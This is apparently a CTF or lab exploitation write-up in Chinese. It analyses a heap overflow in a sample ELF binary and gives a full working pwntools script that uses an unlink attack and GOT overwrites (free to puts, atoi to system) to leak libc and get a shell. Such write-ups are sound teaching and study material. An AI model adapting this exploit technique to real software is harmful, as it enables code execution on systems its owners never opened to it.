# 漏洞利用文档

## 执行环境

基于exp脚本和程序分析，程序的运行环境如下：

- **二进制类型**：ELF 64位可执行文件，使用动态链接
- **安全保护**：从漏洞利用成功来看，程序可能未启用完整的ASLR、PIE或堆保护（如Heap Canaries），允许unlink攻击和GOT表覆盖
- **依赖库**：依赖标准C库（libc），exp中通过`elf.libc`自动获取
- **运行环境**：在Linux系统上运行，使用pwntools进行漏洞利用开发
- **关键地址**：全局指针数组位于`0x602140`，GOT表位于`0x602000`附近区域

## 漏洞成因

### 关键结构体
程序使用简单的堆管理机制：
- **全局指针数组 `::s`**：位于`0x602140`，存储所有分配的内存块指针
- **索引计数器 `dword_602100`**：记录当前分配的块数量

### 漏洞分析
**漏洞位置**：`sub_4009E8`函数（选项2的写入功能）

**漏洞类型**：堆溢出漏洞

**根本原因**：
```c
fgets(s, 16, stdin);
n = atoll(s);  // 用户可指定任意写入大小
ptr = (&::s)[v2];
for ( i = fread(ptr, 1u, n, stdin); i > 0; i = fread(ptr, 1u, n, stdin) )
{
  ptr += i;
  n -= i;
}
```

**漏洞细节**：
1. **缺少边界检查**：函数接受用户指定的写入大小`n`，但未验证是否超过实际分配的内存大小
2. **无条件循环写入**：使用`fread`循环写入，直到写入`n`字节，可能超出分配边界
3. **用户控制的数据流**：攻击者可以分配小内存块，然后指定大尺寸写入，导致堆溢出

**利用可行性**：通过精心构造的溢出数据，可以覆盖相邻chunk的元数据，触发unlink攻击，最终获得任意地址读写能力。

## 漏洞利用过程

### 利用策略概述
整个利用过程采用经典的unlink攻击结合GOT表覆盖技术：
1. 构造堆布局为unlink攻击创造条件
2. 通过堆溢出伪造chunk元数据
3. 触发unlink修改全局指针数组
4. 获得任意地址读写能力后修改GOT表
5. 泄露libc地址并计算system函数地址
6. 最终获取shell

### 详细内存变化过程

| 步骤 | 操作 | 关键内存变化 | 利用效果 |
|------|------|--------------|----------|
| 1 | `alloc(0x100); alloc(0x30); alloc(0x80)` | 创建三个chunk：块1(0x100)、块2(0x30)、块3(0x80)，中间有0x411大小的间隙chunk | 建立初始堆布局，为后续溢出创造条件 |
| 2 | 编辑块2写入伪造chunk头 | 块2的size改为0x20，fd指向`0x602138`，bk指向`0x602140`，修改块3的prev_size为0x30 | 准备unlink攻击的伪造chunk结构 |
| 3 | `free(3)` | 触发unlink：全局指针`0x602150`从`0x1d3d7540`改为`0x602138` | 获得任意地址读写能力，全局指针指向可控区域 |
| 4 | 编辑块2写入payload2 | 全局指针数组被修改：索引0→free@got, 索引1→puts@got, 索引2→atoi@got | 建立GOT表读写通道 |
| 5 | 编辑块0写入payload3 | free@got.plt从libc地址改为`0x400760`(puts@plt) | 将free函数重定向到puts，用于地址泄露 |
| 6 | `free(1)` | 调用puts输出libc地址，计算得到libc基址和system地址 | 成功泄露libc关键地址 |
| 7 | 编辑块2写入payload4 | atoi@got.plt被覆盖为system地址 | 完成GOT表劫持，为获取shell做准备 |

### 堆布局演变
```
初始状态:
[块1:0x100] -> [间隙chunk:0x411] -> [块2:0x30] -> [块3:0x80]

利用后状态:
[块1] -> [伪造chunk] -> [块2(已修改)] -> [块3(已free)]
```

### 关键转折点
- **步骤3**：unlink攻击成功修改全局指针，获得任意地址读写能力
- **步骤6**：通过puts泄露libc地址，突破ASLR保护
- **步骤7**：GOT表劫持完成，实现任意代码执行

## Exploit

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

# 启动目标程序
p = process('./data/sample0')
elf = ELF('./data/sample0')
libc = elf.libc
g_pointer = 0x602140  # 全局指针数组地址

def alloc(size:int):
    p.sendline(b'1')
    p.sendline(str(size).encode())
    return p.recv()

def edit(idx:int, size:bytes, content:str):
    p.sendline(b'2')
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())  # 漏洞点：可指定任意写入大小
    if type(content)==str:
        p.sendline(content.encode())
    elif type(content)==bytes:
        p.sendline(content)
    return p.recv()

def free(idx):
    p.sendline(b'3')
    p.sendline(str(idx).encode())
    return p.recv()

def show(idx):
    p.sendline(b'4')
    p.sendline(str(idx).encode())
    return p.recv()

# 步骤1: 建立堆布局
alloc(0x100)
alloc(0x30)
alloc(0x80)

# 步骤2: 构造unlink攻击payload
# 伪造chunk头：prev_size=0, size=0x20, fd/bk指向全局数组附近
payload = p64(0) + p64(0x20) + p64(g_pointer+16-0x18) + p64(g_pointer+16-0x10) + p64(0x20) + b'a'*8 + p64(0x30) + p64(0x90)
edit(2, len(payload), payload)  # 利用堆溢出覆盖块2和部分块3

# 步骤3: 触发unlink攻击
free(3)  # 释放块3触发unlink，修改全局指针

# 步骤4: 建立GOT表读写通道
payload2 = b'b'*8 + p64(elf.got['free']) + p64(elf.got['puts']) + p64(elf.got['atoi'])
edit(2, len(payload2), payload2)  # 修改全局指针指向GOT表

# 步骤5: 将free@got改为puts@plt，用于地址泄露
payload3 = p64(elf.plt['puts'])
edit(0, len(payload3), payload3)  # 通过索引0写入free@got

# 步骤6: 泄露libc地址
ret = '0x' + free(1)[:6][::-1].hex()  # 调用free(实际是puts)泄露地址
puts_addr = int(ret, 16)
libc_addr = puts_addr - libc.sym['puts']  # 计算libc基址
system_addr = libc_addr + libc.sym['system']  # 计算system地址

# 步骤7: 将atoi@got改为system地址
payload4 = p64(system_addr)
edit(2, len(payload4), payload4)  # 通过索引2写入atoi@got

# 获取shell
p.interactive()  # 此时调用atoi将执行system，可输入/bin/sh等命令
```

### 关键注释说明
- **全局指针操作**：通过修改全局指针数组，实现任意地址读写
- **unlink机制**：利用`*(P->fd + 0x18) = P->bk`和`*(P->bk + 0x10) = P->fd`修改内存
- **GOT劫持**：依次修改free@got和atoi@got，实现函数重定向
- **地址泄露**：通过puts输出libc函数地址，绕过ASLR
- **最终利用**：将atoi替换为system，通过输入命令字符串获取shell

该漏洞利用成功演示了如何通过堆溢出漏洞逐步提升权限，最终实现任意代码执行。
